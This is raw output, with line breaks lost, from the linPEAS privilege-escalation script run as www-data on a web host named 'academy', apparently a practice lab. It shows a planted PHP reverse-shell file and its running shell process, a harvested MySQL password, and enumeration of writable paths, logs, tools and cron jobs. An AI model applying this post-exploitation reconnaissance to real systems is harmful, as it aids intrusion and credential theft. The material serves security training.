              240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             -rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0[+] Interesting writable Files[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 /dev/mqueue                                                                                                                                                    /dev/mqueue/linpeas.txt/dev/shm/run/lock/run/lock/apache2/sys/kernel/security/apparmor/.access/sys/kernel/security/apparmor/.load/sys/kernel/security/apparmor/.remove/sys/kernel/security/apparmor/.replace/tmp/tmp/linpeas.sh/var/cache/apache2/mod_cache_disk/var/lib/php/sessions/var/lib/phpmyadmin/var/lib/phpmyadmin/tmp/var/lib/phpmyadmin/tmp/twig/var/lib/phpmyadmin/tmp/twig/15/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php/var/lib/phpmyadmin/tmp/twig/21/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php/var/lib/phpmyadmin/tmp/twig/22/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php/var/lib/phpmyadmin/tmp/twig/28/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php/var/lib/phpmyadmin/tmp/twig/2e/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php/var/lib/phpmyadmin/tmp/twig/31/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php/var/lib/phpmyadmin/tmp/twig/36/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php/var/lib/phpmyadmin/tmp/twig/3b/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php/var/lib/phpmyadmin/tmp/twig/41/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php/var/lib/phpmyadmin/tmp/twig/42/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php/var/lib/phpmyadmin/tmp/twig/43/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php/var/lib/phpmyadmin/tmp/twig/4c/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php/var/lib/phpmyadmin/tmp/twig/4e/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php/var/lib/phpmyadmin/tmp/twig/4f/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php/var/lib/phpmyadmin/tmp/twig/53/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php/var/lib/phpmyadmin/tmp/twig/5c/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php/var/lib/phpmyadmin/tmp/twig/61/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php/var/lib/phpmyadmin/tmp/twig/6b/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php/var/lib/phpmyadmin/tmp/twig/6c/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php/var/lib/phpmyadmin/tmp/twig/73/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php/var/lib/phpmyadmin/tmp/twig/78/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php/var/lib/phpmyadmin/tmp/twig/7d/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php/var/lib/phpmyadmin/tmp/twig/7f/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php/var/lib/phpmyadmin/tmp/twig/8a/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php/var/lib/phpmyadmin/tmp/twig/8b/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php/var/lib/phpmyadmin/tmp/twig/96/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php/var/lib/phpmyadmin/tmp/twig/97/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php/var/lib/phpmyadmin/tmp/twig/99/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php/var/lib/phpmyadmin/tmp/twig/9d/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php/var/lib/phpmyadmin/tmp/twig/9e/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php/var/lib/phpmyadmin/tmp/twig/a0/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php/var/lib/phpmyadmin/tmp/twig/a4/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php/var/lib/phpmyadmin/tmp/twig/a7/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php/var/lib/phpmyadmin/tmp/twig/ae/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php/var/lib/phpmyadmin/tmp/twig/af/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php/var/lib/phpmyadmin/tmp/twig/b6/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php/var/lib/phpmyadmin/tmp/twig/c3/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php/var/lib/phpmyadmin/tmp/twig/c5/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php/var/lib/phpmyadmin/tmp/twig/c7/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php/var/lib/phpmyadmin/tmp/twig/ca/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php/var/lib/phpmyadmin/tmp/twig/d6/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php/var/lib/phpmyadmin/tmp/twig/dd/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php/var/lib/phpmyadmin/tmp/twig/e8/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php/var/lib/phpmyadmin/tmp/twig/e9/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php/var/lib/phpmyadmin/tmp/twig/f5/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php/var/lib/phpmyadmin/tmp/twig/fa/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php/var/tmp/var/www/html/academy/var/www/html/academy/admin/var/www/html/academy/admin/assets/var/www/html/academy/admin/assets/css/var/www/html/academy/admin/assets/css/bootstrap.css/var/www/html/academy/admin/assets/css/font-awesome.css/var/www/html/academy/admin/assets/css/style.css/var/www/html/academy/admin/assets/fonts/var/www/html/academy/admin/assets/fonts/FontAwesome.otf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/admin/assets/img/var/www/html/academy/admin/assets/js/var/www/html/academy/admin/assets/js/bootstrap.js/var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/check_availability.php/var/www/html/academy/admin/course.php/var/www/html/academy/admin/department.php/var/www/html/academy/admin/edit-course.php/var/www/html/academy/admin/enroll-history.php/var/www/html/academy/admin/includes/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/includes/footer.php/var/www/html/academy/admin/includes/header.php/var/www/html/academy/admin/includes/menubar.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/level.php/var/www/html/academy/admin/logout.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/print.php/var/www/html/academy/admin/semester.php/var/www/html/academy/admin/session.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/admin/user-log.php/var/www/html/academy/assets/var/www/html/academy/assets/css/var/www/html/academy/assets/css/bootstrap.css/var/www/html/academy/assets/css/font-awesome.css/var/www/html/academy/assets/css/style.css/var/www/html/academy/assets/fonts/var/www/html/academy/assets/fonts/FontAwesome.otf/var/www/html/academy/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/assets/img/var/www/html/academy/assets/js/var/www/html/academy/assets/js/bootstrap.js/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/check_availability.php/var/www/html/academy/db/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/enroll-history.php/var/www/html/academy/enroll.php/var/www/html/academy/includes/var/www/html/academy/includes/config.php/var/www/html/academy/includes/footer.php/var/www/html/academy/includes/header.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/logout.php/var/www/html/academy/my-profile.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/print.php/var/www/html/academy/studentphoto/var/www/html/academy/studentphoto/php-rev.php/tmp/linpeas.sh/dev/mqueue/linpeas.txt[+] Searching passwords in config PHP files$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        $mysql_password = "My_V3ryS3cur3_P4ss";[+] Finding IPs inside logs (limit 100)     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                                 24 /var/log/dpkg.log.1:1.8.2.3     14 /var/log/dpkg.log.1:1.8.4.3      9 /var/log/wtmp:192.168.10.31      7 /var/log/dpkg.log.1:7.43.0.2      7 /var/log/dpkg.log.1:4.8.6.1      7 /var/log/dpkg.log.1:1.7.3.2      7 /var/log/dpkg.log.1:0.5.10.2      7 /var/log/dpkg.log.1:0.19.8.1      4 /var/log/installer/status:1.2.3.3      1 /var/log/lastlog:192.168.10.31[+] Finding passwords inside logs (limit 100)/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                /var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1/var/log/installer/status:Description: Set up users and passwords[+] Finding emails inside logs (limit 100)      1 /var/log/installer/status:aeb@debian.org                                                                                                                     1 /var/log/installer/status:anibal@debian.org      2 /var/log/installer/status:berni@debian.org     40 /var/log/installer/status:debian-boot@lists.debian.org     16 /var/log/installer/status:debian-kernel@lists.debian.org      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org      1 /var/log/installer/status:debian@jff.email      1 /var/log/installer/status:djpig@debian.org      4 /var/log/installer/status:gcs@debian.org      2 /var/log/installer/status:guillem@debian.org      1 /var/log/installer/status:guus@debian.org      1 /var/log/installer/status:linux-xfs@vger.kernel.org      2 /var/log/installer/status:mmind@debian.org      1 /var/log/installer/status:open-iscsi@packages.debian.org      1 /var/log/installer/status:open-isns@packages.debian.org      1 /var/log/installer/status:packages@release.debian.org      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net      1 /var/log/installer/status:petere@debian.org      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org      1 /var/log/installer/status:rogershimizu@gmail.com      2 /var/log/installer/status:team+lvm@tracker.debian.org      1 /var/log/installer/status:tytso@mit.edu      1 /var/log/installer/status:wpa@packages.debian.org      1 /var/log/installer/status:xnox@debian.org[+] Finding *password* or *credential* files in home                                                                                                                                                               [+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             /var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/includes/config.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'./etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries/etc/debconf.conf:Accept-Type: password/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat/etc/debconf.conf:Name: passwords/etc/debconf.conf:Reject-Type: password/etc/debconf.conf:Stack: config, passwordsLinux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEYEND:                                                                                                                                                         RED/YELLOW: 99% a PE vector  RED: You must take a look at it  LightCyan: Users with console  Blue: Users without console & mounted devs  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)   LightMangenta: Your username====================================( Basic information )=====================================OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)Hostname: academyWritable folder: /dev/shm[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                                                                                                                                                                                   ====================================( System Information )====================================[+] Operative system                                                                                                                                           [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      Distributor ID: DebianDescription:    Debian GNU/Linux 10 (buster)Release:        10Codename:       buster[+] Sudo versionsudo Not Found                                                                                                                                                                                                                                                                                                                [+] PATH[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin[+] DateSat Jul 29 06:37:17 EDT 2023                                                                                                                                   [+] System statsFilesystem      Size  Used Avail Use% Mounted on                                                                                                               /dev/sda1       6.9G  1.9G  4.7G  29% /udev            479M     0  479M   0% /devtmpfs           494M     0  494M   0% /dev/shmtmpfs            99M  4.3M   95M   5% /runtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           494M     0  494M   0% /sys/fs/cgrouptmpfs            99M     0   99M   0% /run/user/0              total        used        free      shared  buff/cache   availableMem:        1009960      178916      474532       10816      356512      640884Swap:        998396           0      998396[+] Environment[i] Any private information inside environment variables?                                                                                                      HISTFILESIZE=0                                                                                                                                                 APACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidJOURNAL_STREAM=9:13967PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9APACHE_LOCK_DIR=/var/lock/apache2LANG=CHISTSIZE=0APACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_LOG_DIR=/var/log/apache2HISTFILE=/dev/null[+] Looking for Signature verification failed in dmseg Not Found                                                                                                                                                                                                                                                                                                                    [+] selinux enabled? .......... sestatus Not Found[+] Printer? .......... lpstat Not Found                                                                                                                       [+] Is this a container? .......... No                                                                                                                         [+] Is ASLR enabled? .......... Yes                                                                                                                            =========================================( Devices )==========================================[+] Any sd* disk in /dev? (limit 20)                                                                                                                           sda                                                                                                                                                            sda1sda2sda5[+] Unmounted file-system?[i] Check if you can mount umounted devices                                                                                                                    UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0====================================( Available Software )====================================[+] Useful software?                                                                                                                                           /usr/bin/nc                                                                                                                                                    /usr/bin/netcat/usr/bin/nc.traditional/usr/bin/wget/usr/bin/ping/usr/bin/base64/usr/bin/socat/usr/bin/python/usr/bin/python2/usr/bin/python3/usr/bin/python2.7/usr/bin/python3.7/usr/bin/perl/usr/bin/php[+] Installed compilers?Compilers Not Found                                                                                                                                                                                                                                                                                                           ================================( Processes, Cron & Services )================================[+] Cleaned processes                                                                                                                                          [i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/initroot       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journaldroot       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevdsystemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncdroot       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -froot       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logindmessage+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyroot       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONEroot       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.confroot       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -Droot       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k startmysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqldwww-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k startroot       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --userroot       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bashroot       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclientroot      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclientwww-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -iwww-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -iwww-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.shwww-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux[+] Binary processes permissions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                       56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                          0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd[+] Cron jobs[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 -rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          /etc/cron.d:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rw-r--r--  1 root root  712 Dec 17  2018 php/etc/cron.daily:total 40drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2-rwxr-xr-x  1 root root 1478 May 12  2020 